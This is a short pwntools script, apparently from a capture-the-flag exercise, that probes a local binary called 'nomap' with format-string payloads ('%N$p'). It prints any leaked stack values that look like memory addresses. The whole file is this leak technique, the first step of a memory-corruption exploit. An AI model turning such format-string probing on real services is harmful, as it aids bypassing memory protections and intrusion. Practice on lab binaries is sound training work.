from pwn import *
elf = context.binary = ELF("./nomap")

for i in range(50):
    p = process()
    p.sendline(f"%{i}$p")
    p.recvuntil(b"format string sini: ")
    hasil = p.recvline().strip().decode()
    
    print(f"{i}: " + hasil)
    
    try:
        # Check if the leaked value is a valid hexadecimal address
        if hasil.startswith('0x'):
            leaked_value = int(hasil, 16)
            result = leaked_value
            print(f"Leaked value {hex(result)}")
        else:
            raise ValueError("Not a valid address")
    except (ValueError, TypeError):
        print(f"{i}: Skipping invalid value")

    p.close()
